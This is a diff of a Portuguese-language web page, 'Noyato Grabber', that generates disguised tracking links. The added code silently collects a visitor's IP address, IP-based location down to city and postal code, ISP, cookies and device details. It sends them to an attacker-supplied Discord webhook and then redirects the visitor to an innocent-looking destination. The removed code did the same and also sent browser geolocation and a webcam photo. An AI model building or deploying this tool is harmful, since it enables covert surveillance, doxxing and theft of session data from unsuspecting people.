@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Grabber & Tracker 3.0 by Noyato</title>
+<title>Tracker Full data by Noyato</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
   body {
@@ -27,7 +27,7 @@
     text-shadow: 0 0 12px #ff0000, 0 0 25px #ff0000;
   }
   p.description {
-    max-width: 520px;
+    max-width: 480px;
     margin-bottom: 1.8em;
     text-align: center;
     font-size: 1rem;
@@ -39,7 +39,7 @@
     border-radius: 18px;
     box-shadow: 0 10px 30px rgb(255 0 0 / 0.3);
     width: 100%;
-    max-width: 540px;
+    max-width: 520px;
     backdrop-filter: blur(18px);
     margin-bottom: 2em;
     position: relative;
@@ -101,10 +101,9 @@
     overflow-y: auto;
     color: #ffdddd;
     border: 1.5px solid #ff1111;
-    user-select: all;
   }
   .footer {
-    margin-top: 3em;
+    margin-top: 2.5em;
     font-size: 0.9rem;
     color: #aab2bd;
     text-align: center;
@@ -122,7 +121,7 @@
     background: rgba(0, 0, 0, 0.18);
     padding: 12px 16px;
     border-radius: 12px;
-    margin-top: 20px;
+    margin-top: 22px;
     cursor: pointer;
     color: #d1d5db;
     font-size: 0.92rem;
@@ -167,15 +166,15 @@
 </style>
 </head>
 <body>
-<h1>Noyato Grabber 2.5 </h1>
-<p class="description">esse site foi criado para testes,para coleta de informações como IP, coordenada, um tracking por permissão no navegador etcc. Use com responsabilidade.</p>
+<h1>Noyato Grabber 2.0 Full data</h1>
+<p class="description">sitezinho de Tracker Full data pra testa as habilidades </p>
 <div class="container" id="input-container">
   <label for="destUrl">URL de destino (ex: https://example.com)</label>
   <input type="url" id="destUrl" placeholder="https://example.com" autocomplete="off" required />
   
   <label for="webhookUrl">Webhook do Discord (URL do canal para receber dados)</label>
   <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" required />
-
+  
   <div class="radio-group">
     <label><input type="radio" name="mode" value="grab" checked /> Grab (dados IP básicos)</label>
     <label><input type="radio" name="mode" value="tracking" /> Tracking (geolocalização)</label>
@@ -183,9 +182,9 @@
     <label><input type="radio" name="mode" value="full" /> Full (todos os dados)</label>
   </div>
   
-  <button id="generateBtn">Gerar o link do cao</button>
+  <button id="generateBtn">Gerar Link Grabber</button>
   
-  <div class="output" id="output" style="display:none;" title="Clique para copiar"></div>
+  <div class="output" id="output" style="display:none;"></div>
 </div>
 <details>
   <summary>Como criar um webhook no seu canal do Discord?</summary>
@@ -197,9 +196,7 @@
   <p>6. Copie o URL do webhook (começa com <code>https://discord.com/api/webhooks/...</code>).</p>
   <p>7. Cole esse URL no campo "Webhook do Discord" acima.</p>
 </details>
-
 <script>
-  // Função para extrair query string
   function getQueryParams() {
     const params = {};
     const queryString = window.location.search.substring(1);
@@ -211,53 +208,45 @@
     return params;
   }
 
-  const inputContainer = document.getElementById('input-container');
-  const outputDiv = document.getElementById('output');
-  const generateBtn = document.getElementById('generateBtn');
-  const destUrlInput = document.getElementById('destUrl');
-  const webhookUrlInput = document.getElementById('webhookUrl');
+  const inputContainer = document.getElementById("input-container");
+  const outputDiv = document.getElementById("output");
+  const generateBtn = document.getElementById("generateBtn");
+  const destUrlInput = document.getElementById("destUrl");
+  const webhookUrlInput = document.getElementById("webhookUrl");
 
-  generateBtn.addEventListener('click', () => {
+  function generateGrabberLink(dest, webhook) {
+    const baseUrl = window.location.origin + window.location.pathname;
+    const encodedDest = encodeURIComponent(dest);
+    const encodedWebhook = encodeURIComponent(webhook);
+    return `${baseUrl}?dest=${encodedDest}&wh=${encodedWebhook}`;
+  }
+
+  generateBtn.addEventListener("click", () => {
     const dest = destUrlInput.value.trim();
     const webhook = webhookUrlInput.value.trim();
-    const modeElem = document.querySelector('input[name="mode"]:checked');
-    const mode = modeElem ? modeElem.value : 'grab';
-
     if (!dest || !webhook) {
-      alert('Por favor, preencha ambos os campos.');
+      alert("Por favor, preencha ambos os campos.");
       return;
     }
     try {
       new URL(dest);
     } catch {
-      alert('URL de destino inválida.');
+      alert("URL de destino inválida.");
       return;
     }
     try {
       new URL(webhook);
     } catch {
-      alert('Webhook inválido.');
+      alert("Webhook inválido.");
       return;
     }
-
-    // Link gerado com link destino e parâmetro mode
-    const baseUrl = window.location.origin + window.location.pathname;
-    const encodedDest = encodeURIComponent(dest);
-    const grabberLink = `${baseUrl}?dest=${encodedDest}&mode=${mode}`;
-
-    outputDiv.style.display = 'block';
+    const grabberLink = generateGrabberLink(dest, webhook);
+    outputDiv.style.display = "block";
     outputDiv.textContent = grabberLink;
-    outputDiv.title = 'Clique para copiar';
-    outputDiv.scrollIntoView({behavior:'smooth'});
+    outputDiv.scrollIntoView({behavior:"smooth"});
   });
 
-  // Copiar texto ao clicar no output
-  outputDiv.addEventListener('click', () => {
-    navigator.clipboard.writeText(outputDiv.textContent);
-    alert('Link copiado para a área de transferência!');
-  });
-
-  // Função para coletar cookies
+  // Função para coletar cookies (limitado pelo domínio e permissões)
   function collectCookies() {
     try {
       return document.cookie || "Nenhum cookie disponível";
@@ -266,7 +255,7 @@
     }
   }
 
-  // Detecta marca dispositivo pelo userAgent
+  // Função para detectar se navegador é móvel e extrair marca do dispositivo (ex: Samsung)
   function getDeviceBrand() {
     const ua = navigator.userAgent.toLowerCase();
     if(/samsung/.test(ua)) return "Samsung";
@@ -281,81 +270,18 @@
     return "Desconhecido/Não detectado";
   }
 
-  // Função para pegar localização pelo navegador via Geolocation API
-  function getPosition() {
-    return new Promise((resolve, reject) => {
-      if (!navigator.geolocation) {
-        return reject("Geolocalização não suportada");
-      }
-      navigator.geolocation.getCurrentPosition(pos => resolve(pos), err => reject(err));
-    });
-  }
-
-  // Função para capturar foto da câmera (webcam)
-  async function captureCameraPhoto() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      throw new Error("Webcam não suportada");
-    }
-    
-    const video = document.createElement('video');
-    video.style.display = 'none';
-    document.body.appendChild(video);
-
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    await video.play();
-
-    // Espera pelo vídeo carregado para tirar foto
-    await new Promise(resolve => setTimeout(resolve, 1000));
-
-    // Captura a foto
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0);
-
-    // Para o stream
-    stream.getTracks().forEach(track => track.stop());
-    video.remove();
-
-    // Retorna base64 da foto
-    return canvas.toDataURL('image/png');
-  }
-
-  async function sendWebhook(webhookUrl, payload) {
-    try {
-      const res = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload),
-      });
-      if (!res.ok) {
-        console.error('Erro no webhook:', await res.text());
-      }
-    } catch (e) {
-      console.error('Falha ao enviar webhook:', e);
-    }
-  }
-
+  // Função para coletar dados e enviar via webhook
   (async function executeGrabberIfNeeded() {
     const params = getQueryParams();
-    const destUrl = params.dest ? decodeURIComponent(params.dest) : null;
-    const mode = params.mode || null;
-    const webhookUrl = document.getElementById('webhookUrl').value.trim() || null;
-
-    if (!destUrl || !mode) {
-      // Sem parâmetros necessários, mostra formulário pra gerar link.
+    if (!params.dest || !params.wh) {
+      // Mostrar a interface para gerar link
       return;
     }
 
-    // Pega webhook da URL ou do input, ou exibe erro (webhook pelo input atual)
-    // User must input webhook first to page and submit the link to work for the grabber.
-    // So disable interface
-    inputContainer.style.display = 'none';
-    outputDiv.style.display = 'none';
+    inputContainer.style.display = "none";
+    outputDiv.style.display = "none";
 
-    // Pega IP via API pública
+    // Coleta IP público
     let ip = "Desconhecido";
     try {
       const ipResp = await fetch("https://api.ipify.org?format=json");
@@ -363,89 +289,71 @@
       ip = ipJson.ip || ip;
     } catch {}
 
+    // Dados geográficos do IP com api.ipapi.co para BR e com muitos dados estruturados
+    let geo = {};
+    try {
+      const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
+      geo = await geoResp.json();
+    } catch {}
+
+    // Coleção cookies, userAgent e device info
     const cookies = collectCookies();
     const userAgent = navigator.userAgent || "Desconhecido";
     const deviceBrand = getDeviceBrand();
-    const dateTime = new Date().toLocaleString('pt-BR',{timeZone: 'UTC'});
+    const dateTime = new Date().toLocaleString("pt-BR", {timeZone: geo.timezone || "UTC"});
 
-    // Preparando dados para enviar via webhook
-    let embed = {
-      title: `⚠️ Novo clique no IP Grabber - modo: ${mode.toUpperCase()}`,
+    // Valor importante: Provedor de internet (ISP) brasileiro (se disponível)
+    const isp = geo.org || geo.asn || "Desconhecido";
+
+    // Montagem dos campos do embed do Discord com destaque para dados importantes
+    const webhookUrl = params.wh;
+    const destUrl = decodeURIComponent(params.dest);
+
+    // Campos formatados com seleção do que priorizar
+    const fields = [
+      { name: "🔴 IP", value: ip, inline: true },
+      { name: "🌍 País", value: geo.country_name || "Desconhecido", inline: true },
+      { name: "📍 Estado", value: geo.region || "Desconhecido", inline: true },
+      { name: "🏙 Cidade", value: geo.city || "Desconhecido", inline: true },
+      { name: "🏘 Bairro", value: geo.suburb || "Desconhecido", inline: true },
+      { name: "🛣 Rua", value: geo.street || "Desconhecido", inline: true },
+      { name: "📮 CEP", value: geo.postal || "Desconhecido", inline: true },
+      { name: "📡 ISP / Provedor", value: isp, inline: true },
+      { name: "📅 Data e Hora", value: dateTime, inline: true },
+      { name: "📱 Marca do Dispositivo", value: deviceBrand, inline: true },
+      { name: "🖥 Navegador / Sistema", value: userAgent, inline: false },
+      { name: "🍪 Cookies (limitados)", value: cookies.length > 1024 ? cookies.slice(0,1024) + "..." : cookies, inline: false },
+      { name: "🔗 Link de Destino", value: `[Clique aqui](${destUrl})`, inline: false },
+    ];
+
+    const embed = {
+      title: "⚠️ Novo clique no IP Grabber - FULL DATA",
       color: 0xff0000,
+      fields,
       timestamp: new Date().toISOString(),
-      footer: {text: "Discord Bot by Noyato154"},
-      fields: [
-        {name: "🔴 IP", value: ip, inline: true},
-        {name: "📱 Marca do Dispositivo", value: deviceBrand, inline: true},
-        {name: "🖥 Navegador / Sistema", value: userAgent, inline: false},
-        {name: "🍪 Cookies", value: cookies.length > 1024 ? cookies.slice(0,1024)+"..." : cookies, inline: false},
-        {name: "🔗 Link de Destino", value: "Instagram", inline: false}
-      ]
+      footer: { text: "Discord Bot by Noyato154" },
     };
 
-    if(mode === 'grab') {
-      // Apenas dados básicos já carregados no embed
-    }
-    else if(mode === 'tracking' || mode === 'full') {
-      // Pega geolocalização navegador
-      try {
-        const position = await getPosition();
-        const lat = position.coords.latitude.toFixed(6);
-        const lon = position.coords.longitude.toFixed(6);
-        const accuracy = position.coords.accuracy + " metros";
-
-        // Adiciona campos location no embed
-        embed.fields.push(
-          {name: "📍 Latitude", value: lat, inline: true},
-          {name: "📍 Longitude", value: lon, inline: true},
-          {name: "📏 Precisão", value: accuracy, inline: true},
-        );
-
-        // Cria URL do mapa Google Static Maps (sem expor chave API)
-        const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=600x300&markers=color:red%7C${lat},${lon}&key=YOUR_GOOGLE_MAPS_API_KEY`;
-        embed.image = {url: mapUrl};
-      } catch(err) {
-        embed.fields.push({name: "⚠️ Tracking", value: "Permissão negada ou erro na geolocalização", inline: false});
-      }
+    // Envia para webhook
+    try {
+      await fetch(webhookUrl, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ embeds: [embed] }),
+      });
+    } catch(e) {
+      console.error("Falha ao enviar webhook:", e);
     }
 
-    if(mode === 'camera' || mode === 'full') {
-      // Captura foto webcam e envia num embed separado para evitar limite campos e tamanho
-      try {
-        const photoDataUrl = await captureCameraPhoto();
-
-        // Envia embed separado para foto
-        await sendWebhook(webhookUrl, {
-          embeds: [{
-            title: "📸 Foto da Câmera Capturada",
-            color: 0xff0000,
-            image: {url: photoDataUrl},
-            timestamp: new Date().toISOString(),
-            footer: {text: "Discord Bot by Noyato154"}
-          }]
-        });
-      } catch(e) {
-        // Foto falhou, envia aviso
-        await sendWebhook(webhookUrl, {
-          content: "⚠️ Falha ao capturar foto da câmera ou permissão negada."
-        });
-      }
-    }
-
-    // Envia embed principal com dados
-    await sendWebhook(webhookUrl, {embeds: [embed]});
-
-    // Redireciona após 4s pro destino
+    // Redireciona 1 segundo depois para o link
     setTimeout(() => {
       window.location.href = destUrl;
-    }, 4000);
-
+    }, 500);
   })();
 </script>
-
 <div class="footer">
   Desenvolvido por noyato154 <br />
-  <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer" aria-label="Instagram">
+  <a href="https://www.instagram.com/mnr_magal/" target="_blank" rel="noopener noreferrer">
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="instagram-icon" />
   </a>
 </div>
